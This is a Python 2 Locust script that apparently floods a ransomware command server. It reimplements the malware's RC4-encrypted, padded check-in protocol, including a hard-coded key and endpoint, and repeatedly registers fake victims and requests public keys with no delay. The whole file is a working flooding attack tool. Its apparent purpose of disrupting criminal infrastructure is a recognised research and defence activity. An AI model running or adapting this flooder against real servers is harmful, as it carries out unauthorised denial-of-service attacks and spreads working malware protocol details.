from locust import HttpLocust, TaskSet, task
from string import ascii_uppercase, digits
from random import choice
from re import findall

charset = ascii_uppercase + digits

# we can simply use 1 POST request URL and key for all requests
rc4_key = '0hejz4z87l74'
sorted_rc4_key = ''.join(sorted(rc4_key))
post_url = '/Zoe2aN.php?b=%s' % rc4_key

def generate_hash():
	return ''.join([choice(charset) for _ in xrange(32)])

def rc4(data, key):
	x = 0
	box = range(256)
	for i in range(256):
		x = (x + box[i] + ord(key[i % len(key)])) % 256
		box[i], box[x] = box[x], box[i]

	x = y = 0
	out = []
	for char in data:
		x = (x + 1) % 256
		y = (y + box[x]) % 256
		box[x], box[y] = box[y], box[x]
		out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))
	return ''.join(out)

def pad(key, payload):
	padding_len = sum([int(d) for d in findall(r'\d', key)])
	return '0'*padding_len + payload

class AttackerBehavior(TaskSet):
	@task(1)
	def register_and_request_for_key(self):
		victim_hash = generate_hash()

		# form plaintext request strings
		plaintext_request_reg = "{1|crypt13001|%s|5|1|2|}" % victim_hash
		plaintext_request_key = "{7|crypt13001|%s|1}" % victim_hash

		# encrypt plaintexts
		ciphertext_request_reg = rc4(plaintext_request_reg, sorted_rc4_key)
		ciphertext_request_key = rc4(plaintext_request_key, sorted_rc4_key)

		# encode ciphertexts
		encoded_ciphertext_request_reg = ciphertext_request_reg.encode('hex')
		encoded_ciphertext_request_key = ciphertext_request_key.encode('hex')

		# pad ciphertexts
		padded_ciphertext_request_reg = pad(rc4_key, encoded_ciphertext_request_reg)
		padded_ciphertext_request_key = pad(rc4_key, encoded_ciphertext_request_key)

		# register client
		self.client.post(post_url, { 'd': padded_ciphertext_request_reg } )

		# request for public key
		self.client.post(post_url, { 'd': padded_ciphertext_request_key } )

class Attacker(HttpLocust):
	task_set = AttackerBehavior
	min_wait = 0
	max_wait = 0

